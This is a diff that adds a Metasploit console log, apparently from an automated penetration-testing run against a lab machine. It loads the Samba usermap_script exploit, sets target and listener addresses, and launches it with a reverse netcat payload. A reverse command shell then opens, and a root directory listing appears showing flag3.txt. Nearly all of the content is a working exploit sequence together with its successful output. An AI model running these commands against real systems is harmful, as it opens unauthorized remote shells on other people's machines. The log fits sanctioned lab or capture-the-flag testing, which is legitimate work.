@@ -1,0 +1,47 @@
+[1m[34m[*][0m Spooling to file /home/kali/forcevector/logs/sessions/msfconsole_transcript_192.168.139.128_20260709_094615.txt...
+resource (/tmp/tmpu1612o8x.rc)> setg SessionLogging true
+[0mSession logging enabled.
+SessionLogging => true
+resource (/tmp/tmpu1612o8x.rc)> setg ConsoleLogging true
+[0mConsole logging is now enabled.
+ConsoleLogging => true
+resource (/tmp/tmpu1612o8x.rc)> setg ExitOnSession false
+[0mExitOnSession => false
+resource (/tmp/tmpu1612o8x.rc)> setg CommandShellPty true
+[0mCommandShellPty => true
+resource (/tmp/tmpu1612o8x.rc)> use exploit/multi/samba/usermap_script
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/reverse_netcat
+resource (/tmp/tmpu1612o8x.rc)> set RHOST 192.168.139.128
+[0mRHOST => 192.168.139.128
+resource (/tmp/tmpu1612o8x.rc)> set LHOST 192.168.139.129
+[0mLHOST => 192.168.139.129
+[?1034h[4mmsf[0m exploit([1m[31mmulti/samba/usermap_script[0m) [0m> exploit
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.139.129:4444 
+[1m[34m[*][0m Command shell session 1 opened (192.168.139.129:4444 -> 192.168.139.128:60288) at 2026-07-09 09:46:43 -0400
+
+[0mbin
+boot
+cdrom
+dev
+etc
+flag3.txt
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+
+Abort session 1? [y/N]  
